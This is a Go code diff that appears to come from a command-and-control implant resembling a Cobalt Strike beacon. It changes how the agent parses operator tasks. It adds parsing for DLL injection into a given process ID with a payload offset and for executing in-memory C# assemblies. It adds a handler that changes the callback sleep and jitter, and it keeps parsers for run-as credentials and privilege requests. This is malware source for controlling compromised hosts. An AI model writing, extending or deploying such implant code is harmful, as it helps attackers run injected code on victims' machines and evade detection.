@@ -2,6 +2,7 @@ package command
 
 import (
 	"bytes"
+	"fmt"
 	"main/config"
 	"main/packet"
 	"main/util"
@@ -102,15 +103,10 @@ const (
 )
 
 func parseAnArg(buf *bytes.Buffer) ([]byte, error) {
-	argLenBytes := make([]byte, 4)
-	_, err := buf.Read(argLenBytes)
-	if err != nil {
-		return nil, err
-	}
-	argLen := packet.ReadInt(argLenBytes)
+	argLen := packet.ReadInt(buf)
 	if argLen != 0 {
 		arg := make([]byte, argLen)
-		_, err = buf.Read(arg)
+		_, err := buf.Read(arg)
 		if err != nil {
 			return nil, err
 		}
@@ -123,12 +119,7 @@ func parseAnArg(buf *bytes.Buffer) ([]byte, error) {
 
 func parseGetPrivs(b []byte) ([]string, error) {
 	buf := bytes.NewBuffer(b)
-	privCntByte := make([]byte, 2)
-	_, err := buf.Read(privCntByte)
-	if err != nil {
-		return nil, err
-	}
-	privCnt := int(packet.ReadShort(privCntByte))
+	privCnt := int(packet.ReadShort(buf))
 	privs := make([]string, privCnt)
 	for i := 0; i < privCnt; i++ {
 		tmp, err := parseAnArg(buf)
@@ -181,15 +172,24 @@ func parseRunAs(b []byte) ([]byte, []byte, []byte, []byte, error) {
 	return domain, username, password, cmd, err
 }
 
-func parseInject(b []byte) (uint32, []byte, error) {
+func parseInject(b []byte) (uint32, []byte, uint32, error) {
 	buf := bytes.NewBuffer(b)
-	pidBytes := make([]byte, 4)
-	_, _ = buf.Read(pidBytes)
-	zeroBytes := make([]byte, 4)
-	_, _ = buf.Read(zeroBytes)
-	pid := packet.ReadInt(pidBytes)
+	pid := packet.ReadInt(buf)
+	// if there are prepends in payload, there will be an offset to indicate it
+	offset := packet.ReadInt(buf)
 	dll := buf.Bytes()
-	return pid, dll, nil
+	return pid, dll, offset, nil
+}
+
+func parseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
+	buf := bytes.NewBuffer(b)
+	callBackType := packet.ReadShort(buf)
+	sleepTime := packet.ReadShort(buf)
+	offset := packet.ReadInt(buf)
+	description, err := parseAnArg(buf)
+	csharp, err := parseAnArg(buf)
+	dll := buf.Bytes()
+	return callBackType, sleepTime, offset, description, csharp, dll, err
 }
 
 func ErrorMessage(err string) {
@@ -201,6 +201,16 @@ func ErrorMessage(err string) {
 	finalPaket := packet.MakePacket(CALLBACK_ERROR, result)
 	packet.PushResult(finalPaket)
 }
+
+func ChangeSleep(b []byte) {
+	buf := bytes.NewBuffer(b)
+	sleep := packet.ReadInt(buf)
+	jitter := packet.ReadInt(buf)
+	fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
+	config.WaitTime = int(sleep)
+	config.Jitter = int(jitter)
+}
+
 func Sleep() {
 	sleepTime := config.WaitTime
 	if config.Jitter != 0 {
